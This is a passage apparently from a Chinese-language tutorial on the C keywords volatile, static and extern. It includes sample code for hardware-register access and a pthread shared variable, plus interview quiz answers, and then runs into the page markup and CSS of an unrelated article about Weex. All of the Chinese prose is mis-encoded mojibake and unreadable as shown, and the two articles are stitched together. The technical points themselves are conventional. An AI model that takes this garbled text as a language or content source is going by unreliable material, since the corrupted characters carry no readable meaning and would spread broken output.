<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç¨‹åºæ‹†åˆ†ä¸ºå¤šä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶è´Ÿè´£ç‰¹å®šçš„åŠŸèƒ½æˆ–æ•°æ®ç»“æ„ï¼Œç„¶åé€šè¿‡ <code>extern</code> å£°æ˜å’Œå¤´æ–‡ä»¶æ¥å®ç°è·¨æ–‡ä»¶çš„èµ„æºå…±äº«å’Œè®¿é—®ã€‚è¿™æ˜¯æ¨¡å—åŒ–ç¼–ç¨‹çš„æ ¸å¿ƒæ€æƒ³ä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-16">äº”ã€volatile</h2>
<p><code>volatile</code> å…³é”®å­—åœ¨C/C++ç­‰ç¼–ç¨‹è¯­è¨€ä¸­ç”¨äºå‘Šè¯‰ç¼–è¯‘å™¨ï¼ŒæŸä¸ªå˜é‡çš„å€¼å¯èƒ½ä¼šåœ¨ç¨‹åºçš„æ§åˆ¶æµä¹‹å¤–è¢«æ”¹å˜ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨ç¡¬ä»¶è®¿é—®ã€å¤šçº¿ç¨‹ç¼–ç¨‹æˆ–ä¸­æ–­æœåŠ¡ç¨‹åºä¸­ã€‚ä½¿ç”¨ <code>volatile</code> å¯ä»¥é˜²æ­¢ç¼–è¯‘å™¨å¯¹è¯¥å˜é‡è¿›è¡Œä¼˜åŒ–ï¼Œä»è€Œç¡®ä¿æ¯æ¬¡è®¿é—®è¯¥å˜é‡æ—¶éƒ½èƒ½è¯»å–å…¶æœ€æ–°çš„å€¼ã€‚</p>
<h3 data-id="heading-17">5.1. ä½œç”¨</h3>
<ul>
<li>
<p><strong>é˜²æ­¢ä¼˜åŒ–</strong>ï¼šç¼–è¯‘å™¨åœ¨ä¼˜åŒ–ä»£ç æ—¶ï¼Œå¯èƒ½ä¼šå°†å˜é‡çš„å€¼ç¼“å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œä»¥å‡å°‘å¯¹å†…å­˜çš„è®¿é—®ã€‚å¦‚æœå˜é‡è¢«å£°æ˜ä¸º <code>volatile</code>ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šè¿›è¡Œè¿™ç§ä¼˜åŒ–ï¼Œè€Œæ˜¯æ¯æ¬¡è®¿é—®è¯¥å˜é‡æ—¶éƒ½ç›´æ¥ä»å†…å­˜ä¸­è¯»å–å…¶å€¼ã€‚</p>
</li>
<li>
<p><strong>ç¡¬ä»¶è®¿é—®</strong>ï¼šåœ¨åµŒå…¥å¼ç³»ç»Ÿç¼–ç¨‹ä¸­ï¼Œ<code>volatile</code> å¸¸ç”¨äºè®¿é—®ç¡¬ä»¶å¯„å­˜å™¨çš„å€¼ã€‚è¿™äº›å¯„å­˜å™¨çš„å€¼å¯èƒ½ä¼šç”±ç¡¬ä»¶æœ¬èº«æˆ–å…¶ä»–å¤–éƒ¨è®¾å¤‡æ”¹å˜ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ <code>volatile</code> æ¥ç¡®ä¿æ¯æ¬¡éƒ½èƒ½è¯»å–åˆ°æœ€æ–°çš„å€¼ã€‚</p>
</li>
<li>
<p><strong>å¤šçº¿ç¨‹ç¼–ç¨‹</strong>ï¼šåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªçº¿ç¨‹å¯èƒ½ä¼šä¿®æ”¹å¦ä¸€ä¸ªçº¿ç¨‹ä¸­çš„å˜é‡ã€‚è™½ç„¶C/C++æ ‡å‡†å¹¶æ²¡æœ‰å°† <code>volatile</code> å®šä¹‰ä¸ºçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥æœºåˆ¶ï¼Œä½†åœ¨æŸäº›å¹³å°ä¸Šï¼Œä½¿ç”¨ <code>volatile</code> å¯ä»¥é˜²æ­¢ç¼–è¯‘å™¨å¯¹å…±äº«å˜é‡çš„ä¼˜åŒ–ï¼Œä»è€Œå¢åŠ çº¿ç¨‹é—´é€šä¿¡çš„å¯é æ€§ï¼ˆå°½ç®¡è¿™ä¸æ˜¯è·¨å¹³å°æˆ–æ ‡å‡†çš„æ–¹æ³•ï¼Œé€šå¸¸åº”ä½¿ç”¨åŒæ­¥åŸè¯­å¦‚äº’æ–¥é”ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä¸­æ–­æœåŠ¡ç¨‹åº</strong>ï¼šåœ¨ä¸­æ–­æœåŠ¡ç¨‹åºä¸­ï¼Œå…¨å±€å˜é‡çš„å€¼å¯èƒ½ä¼šç”±ä¸­æ–­å¤„ç†ç¨‹åºæ”¹å˜ã€‚ä½¿ç”¨ <code>volatile</code> å¯ä»¥ç¡®ä¿ä¸»ç¨‹åºåœ¨è®¿é—®è¿™äº›å˜é‡æ—¶èƒ½å¤Ÿè¯»å–åˆ°æœ€æ–°çš„å€¼ã€‚</p>
</li>
</ul>
<h3 data-id="heading-18">5.2. ä»£ç ç¤ºä¾‹</h3>
<p><strong>ç¤ºä¾‹1ï¼šç¡¬ä»¶å¯„å­˜å™¨è®¿é—®</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span>  </span>
  
<span class="hljs-comment">// å‡è®¾æœ‰ä¸€ä¸ªç¡¬ä»¶å¯„å­˜å™¨çš„åœ°å€æ˜¯0x40000000  </span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> HARDWARE_REGISTER *((volatile uint32_t *)0x40000000)  </span>
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-comment">// è¯»å–ç¡¬ä»¶å¯„å­˜å™¨çš„å€¼  </span>
    <span class="hljs-type">uint32_t</span> value = HARDWARE_REGISTER;  
    <span class="hljs-comment">// å¯¹å¯„å­˜å™¨è¿›è¡Œå†™æ“ä½œ  </span>
    HARDWARE_REGISTER = <span class="hljs-number">0xDEADBEEF</span>;  
    <span class="hljs-comment">// å†æ¬¡è¯»å–å¯„å­˜å™¨çš„å€¼  </span>
    value = HARDWARE_REGISTER;  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63007bb6ad074f93835ed7e3dbcdc863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=%2B2ZEKc%2BwcMwd%2FNJB9T3NDr3JKnU%3D" alt="" loading="lazy"/></p>
<p><code>HARDWARE_REGISTER</code> æ˜¯ä¸€ä¸ªå®ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªæŒ‡å‘ç¡¬ä»¶å¯„å­˜å™¨åœ°å€çš„ <code>volatile</code> æŒ‡é’ˆã€‚ç¡®ä¿äº†æ¯æ¬¡è®¿é—® <code>HARDWARE_REGISTER</code> æ—¶éƒ½ä¼šç›´æ¥ä»ç¡¬ä»¶å¯„å­˜å™¨ä¸­è¯»å–æˆ–å†™å…¥å€¼ã€‚</p>
<p><strong>ç¤ºä¾‹2ï¼šå¤šçº¿ç¨‹ç¼–ç¨‹ä¸­çš„å…±äº«å˜é‡</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>  </span>
  
<span class="hljs-comment">// æ³¨æ„ï¼šè¿™ä¸æ˜¯è·¨å¹³å°æˆ–æ ‡å‡†çš„æ–¹æ³•æ¥å®ç°çº¿ç¨‹é—´åŒæ­¥  </span>
<span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> shared_variable = <span class="hljs-number">0</span>;  
  
<span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">thread_function</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> </span>{  
    <span class="hljs-comment">// æ¨¡æ‹Ÿä¸€äº›å·¥ä½œ  </span>
    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);  
    <span class="hljs-comment">// ä¿®æ”¹å…±äº«å˜é‡çš„å€¼  </span>
    shared_variable = <span class="hljs-number">1</span>;  
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;  
}  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-type">pthread_t</span> thread;  
    <span class="hljs-built_in">pthread_create</span>(&amp;thread, <span class="hljs-literal">NULL</span>, thread_function, <span class="hljs-literal">NULL</span>);  
  
    <span class="hljs-comment">// ç­‰å¾…çº¿ç¨‹å®Œæˆå·¥ä½œ  </span>
    <span class="hljs-keyword">while</span> (shared_variable == <span class="hljs-number">0</span>) {  
        <span class="hljs-comment">// è¿™é‡Œå¯èƒ½ä¼šè¿›è¡Œå¿™ç­‰å¾…ï¼Œä½†è¿™ä¸æ˜¯æ¨èçš„åšæ³•  </span>
        <span class="hljs-comment">// åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåº”è¯¥ä½¿ç”¨æ¡ä»¶å˜é‡ã€ä¿¡å·é‡ç­‰åŒæ­¥åŸè¯­  </span>
    }  
  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Shared variable has been changed by the thread.\n"</span>);  
    <span class="hljs-built_in">pthread_join</span>(thread, <span class="hljs-literal">NULL</span>);  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bfe9598e447469badf2907677f7751a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=CMjcF0BCAr%2Ff49bGjT%2B66sIu1mM%3D" alt="" loading="lazy"/></p>
<p><code>shared_variable</code> æ˜¯ä¸€ä¸ª <code>volatile</code> å˜é‡ï¼Œå®ƒåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­è¢«å…±äº«ã€‚è™½ç„¶ <code>volatile</code> åœ¨è¿™é‡Œå¯ä»¥é˜²æ­¢ç¼–è¯‘å™¨å¯¹ <code>shared_variable</code> çš„ä¼˜åŒ–ï¼Œä½†å®ƒå¹¶ä¸èƒ½ä¿è¯çº¿ç¨‹ä¹‹é—´çš„åŒæ­¥ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåº”è¯¥ä½¿ç”¨äº’æ–¥é”ã€æ¡ä»¶å˜é‡ç­‰åŒæ­¥åŸè¯­æ¥ç¡®ä¿çº¿ç¨‹ä¹‹é—´çš„æ­£ç¡®åŒæ­¥ã€‚</p>
<blockquote>
<p><strong><code>volatile</code></strong> <strong>å¹¶ä¸æä¾›åŸå­æ€§ä¿è¯ï¼Œå³å®ƒä¸èƒ½ä¿è¯å¯¹</strong> <strong><code>volatile</code></strong> <strong>å˜é‡çš„è¯»å†™æ“ä½œæ˜¯åŸå­çš„ã€‚åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œå³ä½¿ä½¿ç”¨äº†</strong> <strong><code>volatile</code>****ï¼Œä¹Ÿå¯èƒ½éœ€è¦é¢å¤–çš„åŒæ­¥æœºåˆ¶æ¥ç¡®ä¿å¯¹å…±äº«å˜é‡çš„æ­£ç¡®è®¿é—®ã€‚</strong></p>
</blockquote>
<p>Cè¯­è¨€å…±æœ‰<strong>32ä¸ª</strong>å…³é”®å­—ã€‚è¿™äº›å…³é”®å­—æ ¹æ®ä½œç”¨å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å››ç±»ï¼š</p>
<ul>
<li>
<p><strong>æ•°æ®ç±»å‹å…³é”®å­—</strong>ï¼ˆ12ä¸ªï¼‰ï¼šç”¨äºå£°æ˜å˜é‡çš„æ•°æ®ç±»å‹ã€‚åŒ…æ‹¬charã€doubleã€floatã€intã€longã€shortã€signedã€unsignedã€structã€unionã€enumã€voidç­‰ã€‚</p>
</li>
<li>
<p><strong>æ§åˆ¶è¯­å¥å…³é”®å­—</strong>ï¼ˆ12ä¸ªï¼‰ï¼šç”¨äºæ§åˆ¶ç¨‹åºçš„æµç¨‹ã€‚åŒ…æ‹¬forã€doã€whileã€breakã€continueã€ifã€elseã€gotoã€switchã€caseã€defaultã€returnç­‰ã€‚</p>
</li>
<li>
<p><strong>å­˜å‚¨ç±»å‹å…³é”®å­—</strong>ï¼ˆ4ä¸ªæˆ–5ä¸ªï¼‰ï¼šç”¨äºå£°æ˜å˜é‡çš„å­˜å‚¨ç±»å‹ã€‚å¸¸è§çš„åŒ…æ‹¬autoã€externã€staticã€registerç­‰ï¼Œæœ‰æ—¶ä¹Ÿå°†typedefè§†ä¸ºå­˜å‚¨ç±»å‹å…³é”®å­—çš„ä¸€ç§ï¼Œå°½ç®¡å…¶ä¸»è¦åŠŸèƒ½æ˜¯ä¸ºæ•°æ®ç±»å‹å–åˆ«åã€‚</p>
</li>
<li>
<p><strong>å…¶ä»–å…³é”®å­—</strong>ï¼ˆ3ä¸ªæˆ–4ä¸ªï¼‰ï¼šåŒ…æ‹¬constï¼ˆå£°æ˜åªè¯»å˜é‡ï¼‰ã€sizeofï¼ˆè®¡ç®—æ•°æ®ç±»å‹é•¿åº¦ï¼‰ã€volatileï¼ˆè¯´æ˜å˜é‡åœ¨ç¨‹åºæ‰§è¡Œä¸­å¯è¢«éšå«åœ°æ”¹å˜ï¼‰ï¼Œæœ‰æ—¶ä¸åŒ…æ‹¬typedefï¼Œå› å…¶ä¸»è¦åŠŸèƒ½æ˜¯æ•°æ®ç±»å‹å®šä¹‰ã€‚</p>
</li>
</ul>
<p>è¿™äº›å…³é”®å­—åœ¨Cè¯­è¨€ç¼–ç¨‹ä¸­å…·æœ‰é‡è¦çš„ä½œç”¨ï¼Œæ˜¯æ„æˆCè¯­è¨€ç¨‹åºçš„åŸºæœ¬å…ƒç´ ä¹‹ä¸€ã€‚æŒæ¡è¿™äº›å…³é”®å­—çš„ä½¿ç”¨æ–¹æ³•å’Œæ³¨æ„äº‹é¡¹ï¼Œå¯¹äºå­¦ä¹ Cè¯­è¨€å’Œè¿›è¡ŒCè¯­è¨€ç¼–ç¨‹è‡³å…³é‡è¦ã€‚</p>
<h2 data-id="heading-19">å…­ã€å°æµ‹éªŒ</h2>
<blockquote>
<p><strong>é—®é¢˜ï¼š</strong><code>static</code>å…³é”®å­—çš„ä½œç”¨ï¼Ÿï¼ˆCè¯­è¨€åŸºç¡€é¢è¯•é«˜é¢‘é¢˜ï¼Œå‡ ä¹æ‰€æœ‰å…¬å¸æŠ€æœ¯é¢éƒ½ä¼šæ¶‰åŠï¼‰</p>
</blockquote>
<p><strong>ç­”æ¡ˆ</strong>ï¼š</p>
<ol>
<li>
<p><strong>ä¿®é¥°å±€éƒ¨å˜é‡</strong>ï¼šæ”¹å˜å˜é‡çš„ç”Ÿå‘½å‘¨æœŸï¼Œä½¿å…¶åœ¨ç¨‹åºè¿è¡ŒæœŸé—´ä¸€ç›´å­˜åœ¨ï¼Œä½†ä½œç”¨åŸŸä¸å˜ï¼ˆåªåœ¨å…¶å®šä¹‰çš„å‡½æ•°æˆ–ä»£ç å—å†…å¯è®¿é—®ï¼‰ã€‚å‡½æ•°å¤šæ¬¡è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡ä¿æŒä¸Šä¸€æ¬¡çš„å€¼ã€‚</p>
</li>
<li>
<p><strong>ä¿®é¥°å…¨å±€å˜é‡</strong>ï¼šé™åˆ¶è¯¥å…¨å±€å˜é‡çš„ä½œç”¨åŸŸï¼Œä½¿å…¶ä»…åœ¨å®šä¹‰å®ƒçš„æºæ–‡ä»¶å†…å¯è§ï¼Œé¿å…ä¸å…¶ä»–æºæ–‡ä»¶ä¸­çš„åŒåå…¨å±€å˜é‡å‘ç”Ÿå‘½åå†²çªã€‚</p>
</li>
<li>
<p><strong>ä¿®é¥°å‡½æ•°</strong>ï¼šè¡¨æ˜è¯¥å‡½æ•°æ˜¯é™æ€å‡½æ•°ï¼Œåªåœ¨å®šä¹‰å®ƒçš„æºæ–‡ä»¶å†…å¯è§ï¼Œå¤–éƒ¨æ–‡ä»¶æ— æ³•è°ƒç”¨ã€‚ç”¨äºéšè—å‡½æ•°å®ç°ç»†èŠ‚ã€‚</p>
</li>
</ol>
<blockquote>
<p><strong>é—®é¢˜ï¼š</strong><code>extern</code>å’Œ<code>static</code>åœ¨ä¿®é¥°å…¨å±€å˜é‡æ—¶æœ‰ä½•åŒºåˆ«ï¼Ÿ</p>
</blockquote>
<p><strong>ç­”æ¡ˆ</strong>ï¼š</p>
<ul>
<li>
<p><code>extern</code>ç”¨äº<strong>å£°æ˜</strong>ä¸€ä¸ªåœ¨å…¶ä»–åœ°æ–¹ï¼ˆé€šå¸¸æ˜¯å…¶ä»–æºæ–‡ä»¶ï¼‰<strong>å®šä¹‰</strong>çš„å…¨å±€å˜é‡æˆ–å‡½æ•°ï¼Œç›®çš„æ˜¯æ‰©å±•å…¶ä½œç”¨åŸŸï¼Œä½¿å¾—å½“å‰æ–‡ä»¶å¯ä»¥è®¿é—®å®ƒã€‚å®ƒè¡¨ç¤º<strong>å¤–éƒ¨é“¾æ¥</strong>ã€‚</p>
</li>
<li>
<p><code>static</code>ç”¨äºä¿®é¥°å…¨å±€å˜é‡æ—¶ï¼Œæ˜¯<strong>å®šä¹‰</strong>ä¸€ä¸ªé™æ€å…¨å±€å˜é‡ï¼Œå®ƒå°†è¯¥å˜é‡çš„ä½œç”¨åŸŸ<strong>é™åˆ¶</strong>åœ¨å®šä¹‰å®ƒçš„æœ¬æ–‡ä»¶å†…éƒ¨ï¼Œå¤–éƒ¨æ–‡ä»¶æ— æ³•é€šè¿‡<code>extern</code>å£°æ˜æ¥è®¿é—®å®ƒã€‚å®ƒè¡¨ç¤º<strong>å†…éƒ¨é“¾æ¥</strong>ã€‚</p>
</li>
</ul>
<blockquote>
<p><strong>é—®é¢˜ï¼š</strong><code>volatile</code>å…³é”®å­—çš„ä½œç”¨ï¼Ÿå¹¶ä¸¾ä¾‹è¯´æ˜å…¶å…¸å‹åº”ç”¨åœºæ™¯ã€‚</p>
</blockquote>
<p><strong>ç­”æ¡ˆ</strong>ï¼š</p>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼šå‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¿™ä¸ªå˜é‡çš„å€¼å¯èƒ½ä¼šè¢«ç¨‹åºæœªçŸ¥çš„å› ç´ ï¼ˆå¦‚ç¡¬ä»¶ã€ä¸­æ–­ã€å…¶ä»–çº¿ç¨‹ï¼‰æ›´æ”¹ï¼Œä»è€Œç¦æ­¢ç¼–è¯‘å™¨å¯¹è¯¥å˜é‡çš„è¯»å†™è¿›è¡Œä¼˜åŒ–ï¼ˆå¦‚ç¼“å­˜åˆ°å¯„å­˜å™¨ï¼‰ï¼Œç¡®ä¿æ¯æ¬¡ä½¿ç”¨éƒ½ç›´æ¥ä»å†…å­˜åœ°å€ä¸­å­˜å–ã€‚</p>
</li>
<li>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>
<p><strong>ç¡¬ä»¶å¯„å­˜å™¨æ˜ å°„</strong>ï¼šå¦‚<code>volatile unsigned int *reg = (volatile unsigned int *)0x12345678;</code>ï¼Œå› ä¸ºå¯„å­˜å™¨çš„å€¼ç”±ç¡¬ä»¶æ”¹å˜ã€‚</p>
</li>
<li>
<p><strong>ä¸­æ–­æœåŠ¡ç¨‹åºï¼ˆISRï¼‰ä¸­ä¿®æ”¹çš„å…¨å±€å˜é‡</strong>ï¼šä¸»å¾ªç¯ä¸­æ£€æŸ¥çš„æ ‡å¿—ä½ï¼Œå¯èƒ½åœ¨ISRä¸­è¢«ä¿®æ”¹ã€‚</p>
</li>
<li>
<p><strong>å¤šçº¿ç¨‹åº”ç”¨çš„å…±äº«å†…å­˜åŒº</strong>ï¼šä¸€ä¸ªçº¿ç¨‹å†™çš„å˜é‡ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹æ¥è¯»ï¼ˆæ³¨æ„ï¼š<code>volatile</code>ä¸ä¿è¯åŸå­æ€§ï¼Œå¸¸éœ€ä¸äº’æ–¥é”ç­‰åŒæ­¥æœºåˆ¶é…åˆä½¿ç”¨ï¼‰ã€‚</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>é—®é¢˜</strong>ï¼šC è¯­è¨€ä¸­<code>static</code>ä¿®é¥°å±€éƒ¨å˜é‡ä¸æ™®é€šå±€éƒ¨å˜é‡çš„æ ¸å¿ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆæŸäº’è”ç½‘å…¬å¸ 2024 æ ¡æ‹› C è¯­è¨€å²—ï¼‰</p>
</blockquote>
<p><strong>ç­”æ¡ˆ</strong>ï¼š</p>
<p><strong>â‘  ç”Ÿå‘½å‘¨æœŸ</strong>ï¼š<code>static</code>å±€éƒ¨å˜é‡ä¸ºæ•´ä¸ªç¨‹åºè¿è¡ŒæœŸï¼Œæ™®é€šå±€éƒ¨å˜é‡ä»…åœ¨å‡½æ•°æ‰§è¡ŒæœŸï¼›</p>
<p><strong>â‘¡ å­˜å‚¨ä½ç½®</strong>ï¼š<code>static</code>å±€éƒ¨å˜é‡å­˜å…¨å±€æ•°æ®åŒºï¼Œæ™®é€šå±€éƒ¨å˜é‡å­˜æ ˆåŒºï¼›</p>
<p><strong>â‘¢ åˆå§‹åŒ–</strong>ï¼š<code>static</code>å±€éƒ¨å˜é‡ä»…ç¬¬ä¸€æ¬¡è°ƒç”¨åˆå§‹åŒ–ï¼Œæ™®é€šå±€éƒ¨å˜é‡æ¯æ¬¡è°ƒç”¨é‡æ–°åˆå§‹åŒ–ã€‚</p>
<blockquote>
<p><strong>é—®é¢˜</strong>ï¼š<code>volatile</code>å…³é”®å­—çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿè¯·åˆ—ä¸¾ 2 ä¸ªå…¸å‹åº”ç”¨åœºæ™¯ã€‚ï¼ˆæŸåµŒå…¥å¼ä¼ä¸š 2023 æŠ€æœ¯é¢è¯•ï¼‰</p>
</blockquote>
<p><strong>ç­”æ¡ˆ</strong>ï¼š</p>
<p>ä½œç”¨æ˜¯å‘ŠçŸ¥ç¼–è¯‘å™¨å˜é‡å€¼å¯èƒ½è¢«ç¨‹åºæ§åˆ¶æµå¤–ä¿®æ”¹ï¼Œç¦æ­¢ä¼˜åŒ–ï¼Œç¡®ä¿æ¯æ¬¡ç›´æ¥è¯»å–å†…å­˜æœ€æ–°å€¼ï¼›</p>
<p>åœºæ™¯ï¼šâ‘  åµŒå…¥å¼ç¡¬ä»¶å¯„å­˜å™¨è®¿é—®ï¼›â‘¡ å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„å…±äº«å˜é‡ï¼ˆéœ€é…åˆåŒæ­¥åŸè¯­ï¼‰ã€‚</p>
<blockquote>
<p><strong>é—®é¢˜</strong>ï¼š<code>extern</code>å…³é”®å­—çš„ä½œç”¨åŠä½¿ç”¨æ—¶çš„æ³¨æ„äº‹é¡¹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
</blockquote>
<p><strong>ç­”æ¡ˆ</strong>ï¼š</p>
<p>ä½œç”¨æ˜¯å£°æ˜å…¶ä»–æ–‡ä»¶å®šä¹‰çš„å˜é‡ / å‡½æ•°ï¼Œå®ç°è·¨æ–‡ä»¶è®¿é—®ï¼›</p>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<p>â‘  ä»…å£°æ˜ä¸å®šä¹‰ï¼Œéœ€ä¸å®šä¹‰æ–‡ä»¶çš„ç±»å‹ä¸€è‡´ï¼›</p>
<p>â‘¡ é€šå¸¸åœ¨å¤´æ–‡ä»¶ä¸­å£°æ˜ï¼Œé¿å…é‡å¤å£°æ˜ï¼›</p>
<p>â‘¢ éœ€ç¡®ä¿å®šä¹‰æ–‡ä»¶å‚ä¸ç¼–è¯‘é“¾æ¥ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Weex åº•å±‚åŸç†ä¸ APM]]></title>    <link>https://juejin.cn/post/7590575755491328054</link>    <guid>https://juejin.cn/post/7590575755491328054</guid>    <pubDate>2026-01-02T02:21:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590575755491328054" data-draft-id="7589916567876354090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Weex åº•å±‚åŸç†ä¸ APM"/> <meta itemprop="keywords" content="å‰ç«¯æ¡†æ¶,iOS,Weex"/> <meta itemprop="datePublished" content="2026-01-02T02:21:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­åŸå°åˆ˜"/> <meta itemprop="url" content="https://juejin.cn/user/3175045309408429"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Weex åº•å±‚åŸç†ä¸ APM
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3175045309408429/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­åŸå°åˆ˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T02:21:46.000Z" title="Fri Jan 02 2026 02:21:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»42åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 